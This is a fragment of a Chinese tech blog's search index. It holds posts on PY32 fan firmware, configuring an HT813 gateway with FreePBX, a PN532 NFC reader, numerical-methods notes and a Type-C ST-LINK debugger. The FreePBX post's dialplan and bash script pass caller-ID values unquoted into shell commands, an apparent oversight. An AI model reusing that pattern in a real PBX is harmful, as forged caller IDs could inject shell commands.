WCH-LinkE，烧录时需要给 Type-C 接 3.3V 供电，如果接 5V 则不能识别（所以用不了 这个神奇调试器了），3.3V 供电由于电压过低风扇不转，LED 也不会工作，所以不会导致电脑 USB 接口过载。 接线时最好用万用表测一下 Type-C 测试板上 SWDIO 和 SWCLK 对应的引脚，不同的测试板引脚可能不一样。 固件使用说明 目前固件比较简单，所有功能都在 main.c 里面实现。代码仓库地址：https://github.com/Duanyll/py32-palit-4090 固件功能如下： 按一下 FAN 按钮循环切换风扇转速，共 5 个档位包括停止风扇 按一下 LED 按钮循环切换灯光亮度，共 5 个档位包括关闭灯光 双击 LED 按钮循环切换灯光模式 目前简单实现了彩虹和流星效果，以及七种颜色的常亮 在 main.c 里面的 APP_UpdateLed 函数里面实现自己的灯光效果很容易 上电后默认风扇转一秒钟后停转，灯光为一档亮度彩虹效果，可自行修改代码调整默认效果 附件里提供一个编译好的 elf 固件，可以直接下载到板子上使用。 更多图片","tags":["电子设计","嘉立创eda","py32"],"categories":["技术"]},{"title":"Grandstream HT813 双模语音网关 FreePBX 配置指北","path":"/2024/10/5/HT813-FreePBX/","content":"概述 Grandstream HT813 是一款双模语音网关，支持 FXS 和 FXO 两种接口，可以连接传统的电话机和 PSTN 线路，也可以连接 VoIP 服务器。HT813 最重要的特点是便宜，咸鱼二手价格在 130 元左右，同价位其他语音网关往往只有 FXS 或者 FXO 一种接口。FreePBX 是一款开源的 IP 电话系统，支持 SIP 协议，可以用来搭建企业电话系统。尽管 FreePBX 并不好用（前端卡的离谱），但是免费，而且有大量的社区支持。本文介绍一种使用 HT813 和 FreePBX 搭建简易电话系统的方法，主要列出配置步骤，不涉及具体的技术原理。 我们准备搭建的系统包含以下元素： 有一条中国电信的 PSTN 线路，用于接收来电和拨打外线 有一部传统的电话机，用于拨打和接听电话 有一台运行 FreePBX 的服务器，用于管理电话系统和接收来电 局域网内有若干手机和电脑上的 SIP 软电话，用于拨打和接听电话 希望实现以下功能： 电话机和软电话有独立的分机号，可以互相拨打 电话机和软电话可以通过 PSTN 线路拨打外线 PSTN 线路接收到来电时，所有电话机和软电话同时响铃，任意一台设备可以接听 PSTN 线路支持来电显示和通话录音 硬件准备 HT813 上共有 5 个接口，分别为： 12V 电源接口 WAN 网络接口 LAN 网络接口 FXS 接口：连接传统电话机 FXO 接口：连接 PSTN 线路 HT813 具有 WAN 和 LAN 两个 RJ45 网络接口，自身可作为一台带有 NAT 功能的路由器。在本文中，我们不使用 HT813 的路由功能，将 HT813 的 WAN 接口和 LAN 接口配置成交换机模式，即 HT813 仅作为语音网关使用。HT813、FreePBX 服务器和所有 SIP 设备都连接到同一个局域网中。此模式下，HT813 的任何一个网络接口都可以用来连接局域网，另一个网口可再连接一个局域网内交换机或者其他设备。 HT813 配置 HT813 的 WAN 接口默认通过 DHCP 获取 IP 地址，LAN 接口作为一个 DHCP 服务器，分配 IP 地址给连接到 LAN 接口的设备。WAN 侧可通过路由器管理面板查看 HT813 的 IP 地址，如果二手 HT813 找不到 IP 地址，可以长按 HT813 的 RESET 按钮恢复出厂设置。局域网内浏览器访问 HT813 的 IP 地址，输入默认用户名和密码 admin 和 admin 登录。 HT813 登陆界面 信息页 下图是 HT813 的信息页。 HT813 信息页 红框内显示 HT813 的接口状态，图中是所有配置完成正常工作的状态。只有 HT813 的 FXS FXO 物理接口已连接，且 VOIP 服务器已注册，前面板的灯才会亮起。FXS 和 FXO 接口的状态可以通过前面板的灯和网页上的状态显示来判断。 基本设置页 主要是网络配置和无条件呼叫转移设置。 上网设置 按照需要配置成 DHCP 客户端或静态 IP 地址。由于后续需要在 FreePBX 中配置 HT813 的 IP 地址，建议设置成静态 IP 地址，或在路由器中配置 DHCP 绑定。 语言和时区 建议设成英文，网上的教程大多是英文的。 NAT 模式 不需要 NAT 功能，设成桥接模式。 无条件呼叫转移 为了把外线呼入转移到 FreePBX，需要设置无条件呼叫转移。User ID 编一个特殊的号码，如 0123456789，SIP Server 设置成 FreePBX 的 IP 地址。 改完配置后，点 Update 保存，点 Apply 生效, 部分配置按照提示需要重启 HT813 才能生效。 高级设置页 没有需要特别设置的选项。 备份和恢复 最下面的备份和恢复功能可以备份 HT813 的配置，以防止配置丢失。注意只能导入 XML 格式的配置文件，如果要导入来自其他 HT813 的配置，需要把 XML 文件中的 MAC 地址改成当前 HT813 的 MAC 地址或者删掉 MAC 地址那一行。 Extension 和 FXS 配置 本例中 HT813 的 FXS 接口连接到传统电话机，在 FreePBX 侧看起来和一个 SIP 软电话一样是一个 Extension。 FreePBX 安装后似乎会创建一个默认的 Extension，没有截图。总之最后的结果是，我们需要在 FreePBX 中创建一个分机号为 1000, 用户名是 landline，类型为 PJSIP 的 Extension。 Extension 管理面板 注意要创建一个 Extension，不是 User Manager。 不管 User，没用 1000 分机详情页面 分机设置都是默认的，Secret 是 FreePBX 自动生成的密码，后续需要在 HT813 中配置这个密码。创建完分机后，左下角 Submit 保存，再点右上角红色 Apply Config 生效。 HT813 的 FXS 接口配置页面： 重试超时可以改小一点，方便调试。 端口号要改一下，防止和 FXO 的端口号冲突。 只留 PCMU 和 PCMA，其他的编码格式不需要，多了似乎会导致不出声音。 这两个地区选项可以改一下，这一页改完后点 Update 保存，再点 Apply 生效。 以上配置完成后，HT813 的 FXS 指示灯应该亮起，状态页面上显示 FXS 接口已注册。 添加 SIP 用户 再添加其他 SIP 用户，如手机上的软电话，步骤和添加 FXS Extension 类似，类型，默认 PJSIP，分机号和用户名可以随便编（最好有规律，比如 10 开头，后面会用到）。 SIP 客户端以 Linphone 为例，配置如下： 这样 SIP 客户端之间，以及 SIP 客户端和 HT813 的 FXS 接口上的固定电话之间就可以互相拨打电话了。 Trunk 和 FXO 配置 FXO 接口在 FreePBX 中作为一个 Trunk。 编个密码，后面 FreePBX 配置时会用到。 重试超时改小一点。 注意 FXO 默认端口号是 5062. 不知道为啥要改这个，反正改了。 只留 PCMU 和 PCMA。 不知道为啥要改增益，反正改了。 PSTN 挂断检测 注意: 中国大陆的用户需要修改 FXO 挂断检测选项，否则不能检测到外线挂断，导致外线挂断后 FreePBX 持续响铃。此处不使用基于电流的挂断检测，而是使用基于忙音的挂断检测。按照上图的配置，中国大陆标准的忙音频率是 450Hz 单音，半周期为 350ms. 在 FreePBX 中添加一个 Trunk： Trunk 配置页面 创建一个 pjsip 类型的 Trunk。 这里呼出号码前加 0，这是 HT813 的配置要求，拨打外线时要加 0。 这里填 HT813 的 IP 地址，端口号是 HT813 的 FXO 端口号，用户名和密码是 HT813 的 FXO 配置页面里设置的用户名和密码。 Codec 只留下 ulaw 和 alaw 就够了。 为了消除 Console 里的一个警告，需要在 Admin -&gt; Config Edit 里面给 pjsip.aor_custom_post.conf 文件添加一行： 1max_contacts=1 配到这里两边都应用设置之后，HT813 的 FXO 灯应该亮起，状态页面上显示 FXO 接口已注册。 外线呼入 记得在 HT813 的 Basic Settings 里设置了无条件呼叫转移： 无条件呼叫转移 为了能让所有电话都响铃，需要在 FreePBX 的 Ring Groups 里创建一个 Ring Group： 把所有电话都加进去，这样外线呼入时所有电话都会响铃。 然后转到 Inbound Routes，添加一个 Inbound Route： 在 Settings -&gt; On Hold Music 里可以上传等待音乐，这样外线呼入时等待接听时会播放音乐。 外线呼出 在 FreePBX 的 Outbound Routes 里添加一个 Outbound Route： 这里把 10XX 的内线号码排除掉，这样 SIP 客户端可以直接拨打外线号码，不用加 0。 通话记录和录音 点击 Reports -&gt; CDR Reports，可以看到通话记录和录音。 自动化处理通话记录 可以配置自定义的 Dial Plan，在外线呼入、通话结束等事件发生时，调用任意的程序处理通话记录，比如将通话记录推送到外部的数据库或者 API。下面是一个简单的例子。 在 Admin -&gt; Config Edit 里面找到 extensions_custom.conf 文件，添加以下内容： 1234567891011121314[macro-dial-ringall-predial-hook]exten =&gt; s,1,Noop(Entering user defined context macro-dialout-one-predial-hook in extensions_custom.conf)exten =&gt; s,n,TrySystem(echo \"Dialing from ${CALLERID(num)}\" &gt;&gt; /tmp/dialout.log)exten =&gt; s,n,Set(CHANNEL(hangup_handler_push)=do-this-on-hangup,s,1)exten =&gt; s,n,MacroExit[do-this-on-hangup]exten =&gt; s,1,Noop(Entering user defined context do-this-on-hangup in extensions_custom.conf)exten =&gt; s,n,TrySystem(echo \"Call from ${CALLERID(num)} ended\" &gt;&gt; /tmp/dialout.log)exten =&gt; s,n,ExecIf($[\"${DIALSTATUS}\" = \"CANCEL\"]?TrySystem(echo \"Call from ${CALLERID(num)} cancelled\" &gt;&gt; /tmp/dialout.log))exten =&gt; s,n,ExecIf($[\"${DIALSTATUS}\" = \"NOANSWER\"]?TrySystem(echo \"Call from ${CALLERID(num)} missed\" &gt;&gt; /tmp/dialout.log))exten =&gt; s,n,ExecIf($[\"${DIALSTATUS}\" = \"BUSY\"]?TrySystem(echo \"Call from ${CALLERID(num)} busy\" &gt;&gt; /tmp/dialout.log))exten =&gt; s,n,ExecIf($[\"${DIALSTATUS}\" = \"ANSWER\"]?TrySystem(echo \"Call from ${CALLERID(num)} answered\" &gt;&gt; /tmp/dialout.log))exten =&gt; s,n,Return 这个 Dial Plan 会在外线呼入、通话结束等事件发生时，将通话记录写入 /tmp/dialout.log 文件。按照需要编写脚本并在 TrySystem 里调用，就能实现自定义的通话记录处理。 123456/var/spool/asterisk/monitor/├── 2023│ ├── 03│ │ ├── 27│ │ │ ├── in-0123456789-180xxxxxxxx-20230327-160626-1679904386.9.wav│ │ │ └── out-180xxxxxxxx-1000-20230327-160920-1679904560.17.wav 录音文件存放在 /var/spool/asterisk/monitor/ 目录下，按照通话日期整理目录，文件名包含通话的方向、被叫号码、主叫号码、通话日期（年月日）、通话时间（时分秒）、通话起始的 UNIX 时间戳。 下面的例子进一步演示了如何在通话结束时自动处理录音文件。首先是 extensions_custom.conf 文件的配置： 12345678910111213141516171819202122[macro-dial-ringall-predial-hook]exten =&gt; s,1,Noop(Entering user defined context macro-dialout-one-predial-hook in extensions_custom.conf)exten =&gt; s,n,TrySystem(echo \"Called from ${CALLERID(num)}\" &gt;&gt; /tmp/dialout.log)exten =&gt; s,n,Set(CHANNEL(hangup_handler_push)=macro-hangup-dial-in,s,1)exten =&gt; s,n,Return[macro-hangup-dial-in]exten =&gt; s,1,Noop(Entering user defined context macro-hangup-dial-in in extensions_custom.conf)exten =&gt; s,n,TrySystem(echo \"Call from ${CALLERID(num)} ended, status ${DIALSTATUS}\" &gt;&gt; /tmp/dialout.log)exten =&gt; s,n,TrySystem(process-call-log.sh ${DIALSTATUS} in ${CALLERID(num)})exten =&gt; s,n,Return[macro-dialout-trunk-predial-hook]exten =&gt; s,1,Noop(Entering user defined context macro-dialout-one-predial-hook in extensions_custom.conf)exten =&gt; s,n,Set(CHANNEL(hangup_handler_push)=macro-hangup-dial-out,s,1)exten =&gt; s,n,Return[macro-hangup-dial-out]exten =&gt; s,1,Noop(Entering user defined context macro-hangup-dial-out in extensions_custom.conf)exten =&gt; s,n,TrySystem(echo \"Call to ${DIALEDPEERNUMBER} ended, status ${DIALSTATUS}\" &gt;&gt; /tmp/dialout.log)exten =&gt; s,n,TrySystem(process-call-log.sh ${DIALSTATUS} out ${DIALEDPEERNUMBER})exten =&gt; s,n,Return 在 /usr/local/bin/ 目录下创建一个名为 process-call-log.sh 的脚本文件并添加执行权限，脚本内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/bin/bash# Usage: process-call-log &lt;dialstatus&gt; &lt;direction&gt; &lt;callerid&gt;# Example: process-call-log ANSWER in 12345678# phonenumber: CID of the caller# direction: in or out# status: asterisk dialstatus (ANSWER, NOANSWER, CANCEL, ...)# This script is intended to be called by Asterisk dialplan to process call logs# It is designed to be non-blocking, so that the call can be processed without waiting for the responsefunction push_call_log { DIALSTATUS=$1 DIRECTION=$2 CALLERID=$3 # If $CALLERID has '@', for example \"135792468@trunk\", remove the suffix CALLERID=$(echo $CALLERID | cut -d'@' -f1) # Delay 3 seconds to ensure the recording file is ready sleep 3 TODAY=$(date +%Y/%m/%d) RECORDING_FOLDER=\"/var/spool/asterisk/monitor/$TODAY\" if [ -d $RECORDING_FOLDER ]; then RECORDING_FILE=$(ls -t $RECORDING_FOLDER | grep $CALLERID | head -n 1) if [ -n \"$RECORDING_FILE\" ]; then IFS='-' read -r -a RECORDING_INFO &lt;&lt;&lt; \"$RECORDING_FILE\" DIRECTION=${RECORDING_INFO[0]} CALLEE=${RECORDING_INFO[1]} CALLER=${RECORDING_INFO[2]} DATESTR=${RECORDING_INFO[3]} TIMESTR=${RECORDING_INFO[4]} UNIXTIME=$(echo ${RECORDING_INFO[5]} | sed 's/\\.[^.]*$//') DURATION=$(ffprobe -i \"$RECORDING_FOLDER/$RECORDING_FILE\" -show_entries format=duration -v quiet -of csv=\"p=0\") if ! [[ $DURATION =~ ^[0-9]+([.][0-9]+)?$ ]]; then DURATION=0 fi # if $DIRECTION is \"in\", then $PHONE is $CALLEE, otherwise $PHONE is $CALLER if [ \"$DIRECTION\" == \"in\" ]; then PHONE=$CALLER else PHONE=$CALLEE fi fi fi if [ -z \"$RECORDING_FILE\" ]; then PHONE=$CALLERID DATESTR=$(date +%Y%m%d) TIMESTR=$(date +%H%M%S) UNIXTIME=$(date +%s) DURATION=0 fi # If $PHONE has 12 digits, and starts with \"0\", remove the prefix if [[ $PHONE =~ ^0[0-9]{11}$ ]]; then PHONE=${PHONE:1} fi # &gt;&gt;&gt; Add your code to push the call log to your server or database here &lt;&lt;&lt; # You can use curl or any other method to send the data # Write log to /tmp/push-call-log.log echo \"[$(date)] $CALLERID $DIALSTATUS $RECORDING_FILE $DURATION $ATTACHMENT_ID\" &gt;&gt; /tmp/push-call-log.log}push_call_log \"$1\" \"$2\" \"$3\" &amp;disownexit 0 这个脚本会在通话结束时被调用，处理通话记录和录音文件。它会将通话状态、方向、主叫号码等信息写入日志文件，并可以进一步处理录音文件，比如上传到服务器或数据库。这样就可以避免使用 FreePBX 卡的要死的前端界面来查看通话记录了。","tags":["指北","freepbx","voip"],"categories":["技术"]},{"title":"彩色丝印 PN532 + CH582 读卡器","path":"/2024/10/1/PN532-CH582/","content":"https://oshwhub.com/duanyll/pn532-ch582https://oshwhub.com/duanyll/pn532-ch582 彩色丝印 PN532 + CH582 读卡器 八月份获得了一张嘉立创彩色丝印免费券，看到立创开源上多数彩色丝印工程都是单片机核心板或者是简单的 NFC 卡片，于是为了能让这张彩色丝印券物尽其用（又要有电路，又要有大面积的彩色丝印留空区域），我画了这个 PN532 + CH582 读卡器。立创开源上其他的几个 PN532 工程都是直接引出了 PN532 的串口或是加上了一个 CH340，必须搭配专门的上位机软件才能使用，本工程则是在 PN532 的基础上加上了一个 CH582，既可以通过 USB CDC 串口或 BLE 连接上位机，也可以直接在 CH582 单片机上直接与 PN532 交互，另外引出了串口屏的四线 XH2.54 接口，连接串口屏可开发更多应用。 电路设计 NXP PN532 芯片，支持 ISO14443A/B、FeliCa、NFCIP-1 等多种协议，支持读卡、写卡、模拟卡等功能 通过 UART、SPI、I2C 等多种接口与主控连接，本工程使用了 UART 接口连接 CH582 淘宝上的 PN532 芯片价格在 9 元左右，但是有打磨假货不能用的风险（甚至是好评很多的店铺），建议购买 10 元左右的成品模块拆芯片 左侧是从 PN532 模块上拆下来可用的 PN532，右侧是某店铺 9 元的芯片，有明显打磨和焊锡氧化痕迹，上板无法使用。注意底部散热焊盘右下角的形状不一样。调试可测 26 脚的 RSTOUT_N 测试点，芯片完成复位后应为 3.3V，若为 0V 则芯片或晶振有问题 天线匹配电路 Layout 参考 NXP 的 AN10688，电容电阻值参考 立创开源工程，实测感应距离在 4-5cm 左右 PN532 晶振频率为 27.12MHz 非常用型号 WCH CH582F 低功耗蓝牙 MCU 芯片，带有 32KB RAM 和 512KB Flash，和两路 USB FS OTG 控制器 实际上只用到了一路 USB，可换成 CH573F 或 CH571F，但价格差不多，都在 2 到 3 元左右 支持免烧录器直接通过 USB 下载固件：安装 WCHISPStudio，先按住 SW1 按钮再插入电脑 USB，然后在 WCHISPStudio 中选择固件文件，点击下载即可 两线仿真接口通过 Type-C 的 SBU 引脚引出了, 不过 CH582 是 RISC-V 架构，不支持 ST-Link，只能再用 Type-C 调试板转接到 WCH-Link 来进行仿真调试 BLE 天线设计与板厚有关，本工程使用了 1.6mm 板厚 板上配有 MLT-5020 蜂鸣器，可通过 CH582 的 TMR0 PWM 输出控制蜂鸣器发声 彩色丝印图片来自 Unsplash, 可免费商用，正面图片，背面图片 彩色丝印不耐高温，我用了 260 度的回流焊烤箱焊接，有些发黄，建议用更低的温度 固件 本工程给出的固件基于 WCH 官方例程简单修改，较为简陋，您可以自行按需要修改。固件功能如下： 直接插入电脑 USB，红灯亮起，CH582 会识别为 USB HID 键盘，当检测到 ISO14443A 卡片时蓝灯亮起，蜂鸣器响，会自动读取卡片 UID 并模拟键盘输入 UID 后按回车，类似于扫码枪的功能 按住 SW2 按钮再插入电脑 USB，CH582 会模拟 CH340 芯片，识别成 USB CDC 串口，可搭配多种串口 PN532 上位机软件使用，立创开源上其他 PN532 工程有提供上位机软件。收发数据时红蓝灯会交替闪烁。 按住 SW1 按钮再插入电脑 USB，进入 ISP 模式，可通过 WCHISPStudio 下载固件 (可直接使用附件中的 ch582-hid-cdc.hex, zip 文件为源码) 尝试过使用 WCH 的 BLE 串口透传例程，可以通过 WCH BLE Tool 安卓 APP 连接实现 BLE 串口透传，但是不出现在 MTools BLE 的设备列表中，可能是缺少了某些描述符。 参考 立创开源的其他 PN532 工程 博丽灵梦 附件中有上位机软件 LiiGuang 附件中有上位机软件 更多图片","tags":["电子设计","嘉立创eda"],"categories":["技术"]},{"title":"微分方程数值解速通","path":"/2024/9/4/DE/","content":"Initial Value Problems Problem formulation: Numerical Differentiation Based Methods Grids Evaluate the differential equation at the grid points Replace the derivative by a difference quotient where is the truncation error. The equation becomes Drop the truncation error term And the initial condition gives Error analysis of . The method is first order accurate. Common Numerical Differentiation Formulas Finite difference methods for solving an IVP Stability Use the model problem A-stable: , is bounded? L-stable: For all , , is bounded? Zero-stable: Let , , is bounded? Numerical Integration Based Methods Numerical Intergration Formulas Grids Integrate the differential equation over the interval That is Replace the integral by a quadrature formula Drop the error term Other notes: The idea of Runge-Kutta methods is to replace future values in implicit methods by values predicted by an explicit method. Extension and ghost points are used to handle boundary conditions, by adding extra points to the grid. Conservative methods are used to preserve the total energy of the system. Two-Point Boundary Value Problems Problem formulation: Using the five-step finite difference method, we will eventually get a system of linear equations to solve. Constant boundary conditions will give a tridiagonal system: where The tridiagonal matrix can be solved in operations. To discuss the existence and uniqueness of the solution, we have these theorems: Theorem 1: is invertible when either is strictly diagonally dominant, or is duagonally dominant, and , . Theroem 2: If are continuous on , then the solution of the BVP exists and is unique when the step size satisfies Theorem 3 (Error Analysis): When the conditions of Theorem 2 are satisfied, the error of the finite difference method is where is a constant (, ), is the truncation error, and are the boundary errors. Diffusion Problems Problem formulation: The inhomogeneous heat equation with initial condition and boundary conditions and . 5-step explicit finite difference method will result in a matrix form of where is a symmetric tridiagonal matrix. FDE form: where . To analyze the stability, sbustitute with and deduce from the FDE form. The method is stable if (regardless of ). Useful identities for stability analysis A-Stability: The method is A-stable if for all . L-Stability: The method is L-stable if as . Advection Problems Problem formulation: The advection equation with initial condition and periodic boundary conditions . CFL condition: The numerical domain of dependence must contain the physical domain of dependence. Numerical Wave Propagation Problem formulation: The wave equation with zero boundary conditions and initial conditions and . Solution properties: Substitute the plane wave solution into the wave equation, and extract the coefficients of to get the dispersion relation. Transform the dispersion relation to obtain the phase velocity, and the group velocity, Dispersive: depends on . Dissipative: . Elliptic Problems Problem formulation: The Laplace equation with given boundary conditions. Key points: Banded matrices can be used to solve the Laplace equation. Positive definite matrices (Geršgorin circle theorem) Iterative methods","tags":["微分方程"],"categories":["课程"]},{"title":"Type-C SWD VCP USB 一线通 ST-LINK/V2-1","path":"/2024/9/1/STLink-SBU/","content":"https://oshwhub.com/duanyll/stlink-sbuhttps://oshwhub.com/duanyll/stlink-sbu 省流 摘要 本文提出了一种基于 Type-C 接口调试配件（Debug Accessory）模式的 ST-LINK/V2-1 接 线方案，实现了一次连接同时支持 SWD 调试、VCP 虚拟串口和下行 USB 三种调试功能，而 且支持正反插，便利性较传统的连接方式有显著提升。为了验证方案的可行性，还基于 STM32F103CBT6 和 CH334F 方案设计设计了一款 PCB，验证了方案的可行性。设计的 PCB 除了具备提出的一线通 Type-C 公头，还提供了支持供电的 ST-LINK/V3 Minie 的 STDC-14 小体积标准调试接口，并实现了下行供电的过流和倒灌保护，具备实用价值。最后，本文还 提供了详细的原理图、PCB 设计和 BOM 表，方便读者参考。 引言 自行设计单片机最小系统时，调试接口的设计能明显地影响 PCB 的布局和调试的便利性。 常见的基于排针、测试点等的调试接口设计存在以下问题： 体积大，占用 PCB 空间 需要专用的排线或者探头才能连接到调试接口 接口引脚顺序不统一，反复对照引脚定义连接杜邦线费时费力，容易接错 调试器提供的 5V 或 3V3 供电没有足够的保护措施，可能导致开发板倒灌电脑 USB 接口 调试接口被封闭在开发板内部，需要在外壳上增加额外的开孔 而像 STM32 官方 Discovery 系列开发板采用的将 ST-LINK 集成到开发板上的设计，虽然 改善了连接电脑的便利性，但若需要同时使用 MCU 的 USB 功能，还需要额外的 USB 线连 接到开发板上；另外，板载 ST-LINK 的设计也显著增大了开发板的面积和成本。 本文提出的方案能复用开发板上的 Type-C 接口，无需任何额外的面积和元器件，即可 实现一次连接进行 SWD 调试、VCP 虚拟串口，并连接下行 USB。被调试 MCU 侧只需要一个 常见的、廉价的 12/16Pin Type-C 接口，就可以实现同时使用 SWD 调试和 USB 功能，且 支持正反插。如果开发板不需要 USB 功能，则也可以将 USB 数据线复用为 VCP 虚拟串 口，调试器能自动识别 USB 复用为 VCP 的状态。如果开发板使用了 24Pin Type-C 接口， 则可以同时进行 SWD 调试、VCP 虚拟串口和 USB 功能。针对 24Pin 接口，调试器侧的布 线进行了优化，降低了开发板侧的布线扇出难度。 值得注意的是，基于 Type-C 规范定义的调试配件（Debug Accessory）模式，开发板侧 的 Type-C 调试口也可用作普通的 USB 数据接口，且开发板可以检测调试接口上连接的 是调试器还是普通的 USB 线缆，从而允许派生出更多的应用场景。 相关工作 标准的 JTAG 接口和正版 ST-LINK V2 上巨大的 20Pin 简牛座接口都是通过规范化调试接 口引脚定义来提升接线体验的例子，但是 20Pin 的接口实在是太大了，不适合用在小型开 发板上。ST-Link V3 系列的 STDC-14 调试接口相比于 20Pin 简牛座极大地减小了体积， 然而在开发板侧仍然存在反接的风险，并且价格最低（仍然很高）的 ST-LINK/V3 Minie 不 能提供下行供 电。极客 STM32 电子开发网的 STLINK 价格低廉，能直接通过 7Pin 2.54 排针连接到该店设计的开发板，但是双层排针的设计也 存在反接的可能，且开发板上也要为调试接口付出不小的额外面积。 minoseigenheer 的调试脚位设计 minoseigenheer 基于 Type-C 接口的调试配件模 式设计了一种 SWD over USB-C 方案，通过 Type-C 接口实现了 SWD 调试和下行 USB，是本文的灵感来源之一。然而，该 方案未提供 VCP 虚拟串口功能，并且要求开发板具备 24Pin 全针脚的 Type-C 接口，增加 了开发板侧的成本和布线难度。 本方案通过在规范容差范围内调整开发板侧两个 CC 线 Rd 下拉电阻的阻值，实现了从公口 方向检测母口的插入方向（而不是通常的从母口侧检查公口的方向），从而能在调试器一侧 翻转线序，可以利用两个 SBU 针脚进行 SWDIO 和 SWCLK 两线调试。同时，基于对 Rd 下 拉电阻的检测，可以控制模拟开关切换 D+ D- 用作 USB 或 VCP 串口，在 16Pin Type-C 接口上按需提供尽量多的功能。 方法 Rp，Rd 和 Ra Type-C 规范要求受电端（Sink）在 CC1 和 CC2 上各接入 5.1kR 的下拉电阻，称为 Rd； 供电端在 CC1 和 CC2 接入一定阻值的上拉电阻或电流源 Rp，以将 CC 线上的电压上拉到 一定值，CC 线上的不同电平指示连接建立初期，受电端允许吸入的最大电流。由于正确的 C-C 连接线只允许连接一侧的 CC 引脚，另一侧 CC 引脚要么开路，要么存在 1kR 的下拉 电阻 Ra 用于开启 VCONN 供电。于是根据两条 CC 线上 Rp，Rd，Ra 的连接状态，可以区 分连接设备的类型和插入方向。 CC1 CC2 状态 Rp Rd 未连接 Rp Rd 未连接 未连接 Rp Rd 未连接 Rp-Rd 0.25V-2.04V 使用普通线缆接入设备 Rp-Rd 0.25V-2.04V Rp Rd 未连接 使用普通线缆接入设备 Rp-Ra -0.25V-0.15V Rp-Rd 0.25V-2.04V 使用 E-Marker 线缆接入设备，CC1 是 VCONN Rp-Rd 0.25V-2.04V Rp-Ra -0.25V-0.15V 使用 E-Marker 线缆接入设备，CC2 是 VCONN Rp-Rd 0.25V-2.04V Rp-Rd 0.25V-2.04V 调试配件模式 (Debug Accessory Mode) Rp-Ra -0.25V-0.15V Rp-Ra -0.25V-0.15V 音频配件模式 Rp-Rd 连接的不同电压还能区分供电能力。于是 Type-C 接口在无需传递 PD 报文的情况下 就能区分多种连接设备的类型和插入方向，为调试配件模式提供了可能。由上表发现由于普 通 Type-C 连接器公口一侧只有一个 CC 引脚，故调试配件模式需要使用特制的公口直接连 接到母口。开发板侧母口通过检测两侧 CC 引脚是否同时具有 vRd-Connect 电压是否存在 调试配件的连接，从而控制 Mux 改变接线。（在只使用 USB 2.0 的情况下，本文的方案不 需要进行检测，可直接连线）。 规范的 Type-C 调试配件模式在不进行插入方向检测的情况下，允许将 2, 3, 6, 7, 8, 10, 11 共 7 个引脚用于传输自定义的调试信号。然而，这要求连接器同时具有 24Pin 的 Type-C 接口，且开发板侧的布线难度较大。简易的 16Pin Type-C 接口只能使用 6, 7, 8 三个引脚，若保留 USB 功能，且不在开发板侧增加额外的元器件，实际上只有 8 号引脚 （SBU 引脚）可用。于是不得不实现插入方向检测，以便在 A8 和 B8 上分别传输 SWDIO 和 SWCLK 信号。 Type-C 插入方向检测和线序翻转通常在母口侧进行，但为了不在母口增加元器件，本文将 插入方向检测和线序翻转放在公口侧进行。Type-C 规范给 Rd 电阻提供了很大的容差范 围，通过在母口两侧使用略有差别的 Rd 电阻，公口侧使用相同的 Rp 电阻，则可用比较 器比较两条 CC 线上的电压，从而判断母口的插入方向，进而使用模拟开关交换 SWDIO 和 SWCLK 信号的线序，不需要对调试器的固件进行修改。 开发板侧的两个 SBU 引脚可直连 MCU，不需要额外的元器件。 以上设计可以实现在 16Pin Type-C 口上同时使用 SWD 调试和 USB 功能。对于不支持、不 需要 USB 功能的开发板，是否可以将 USB 数据线复用为 USART 串口呢？可以实现这样的 设计。由于 USB D+ D- 和 USART 的电平比较复杂，所以通过比较器检测 CC1 的分压电 阻来切换模拟开关，实现 USB 和 VCP 的复用。对于 24Pin 完整的母口，则在两侧的高 速信号上引出 VCP 和剩余的调试信号。额外信号调试器公头侧做了双面布线，因此开发板 母口侧只需要单面连接，降低了开发板侧的布线难度。 USB 部分内置了小封装 CH334 Hub 实现上位机一线同时连接调试器和开发板。STDC-14 调 试接口利用未定义引脚增加了 5V 供电并受到 TPS2553 芯片保护，防止过流和倒灌，USB 公头旁的红色 LED 指示供电故障。设计的过流保护电流为 1.5A，基本满足多数需求，可自 行调整。（注：正版 ST-LINK/V2-1 固件具有使用 GPIO 引脚控制负载开关的功能，在 USB 握手初期可限制电流到 100mA 以满足 USB 规范。实际上几乎所有的 USB 接口都没有严格 执行 100mA 的限制，所以这个功能在本文的设计中没有实现。） 实验和讨论 已验证此调试器可刷入 ST-LINK/V2-1 固件并正常工作，支持正反插。DAPLink 固件可以刷 入并被上位机 PyOCD 识别，暂未测试 SWD 调试功能。已验证短路保护和倒灌保护功能，供 电故障时 LED 亮起。下面是注意事项： CH334 免晶振功能： 本设计为了节约 PCB 空间，需要使用 CH334 的内部晶振。尽 管根据沁恒论坛上的答复 1 2，目前最新的 CH334 除了 CH334S 封装均支持免晶振功能，但是截至 2024 年 9 月立创贴片的 CH334F 不能免晶 振，无法正常工作。2024 年 8 月 这家淘宝店的 CH334F 是可以免晶振的。本设计有 CH334F 和 CH334P 两个版本，建议向卖家确认是否支持免 晶振功能。 STM32 容量: 请使用 128kB 容量的 STM32F103CBT6，否则无法刷入 ST-LINK/V2-1 固件。其余国产替代芯片理论上可行，但未测试。 固件刷入方式： 本调试器自身的 SWD 调试接口也使用一线通方案引出到上位机 Type-C 母座上。制作第一个调试器时，可以购买一个 Type-C 公母头测试板，在调试器 母座侧使用测试板连接电脑，再使用一个普通 ST-LINK 刷入固件。 接线需要先接通地线，再使用万用表电压档测量测试板上 A5，A8，B5，B8 四个引脚 的电压，具有 3.3V 电压的引脚是 SWDIO，SWDIO 对角的引脚是 SWCLK。测试板另一 头可直接连接电脑 USB 接口。接线如下图所示: 使用 Type-C 测试板烧录固件 下载安装打开 STM32CubeProgrammer。 点击右上角 Connect 连接调试器，成功连接后左下角显示目标芯片信息。 点击连接 连接成功 烧录广为流传的 STLinkV2.J28.M18.bin 版本固件。 注意这个版本的固件不能正常使用，还需进行一次固件升级。点击 Disconnect 断开 连接，移除测试板和另一个调试器，只连接本调试器。 调试器插上电脑后，不点击其他按钮，直接点击 Firmware Upgrade 按钮 点击按钮升级固件后即可正常使用。 成功烧录一个调试器后，可以使用这个调试器的公口对插下一个调试器进行烧录，无 需再次使用测试板。 DAPLink 这块板有 USB 重枚举电路，需要使用兼容 ST-LINK/V2-1 的 DAPLink 固 件，如 DAP103 板厚和叠层 0.8 板厚 4 层板，JLC04161H-3313 叠层（可使用 1-4 层沉金免费 券） Type-C DRP 调试器只能做 Source，不能做 Sink。目标开发板侧如果不使用 PD 协 议芯片，或者 PD 协议芯片需要外置下拉电阻，可直接按本文设计放置 Rd 电阻。若 PD 芯片内置 Rd 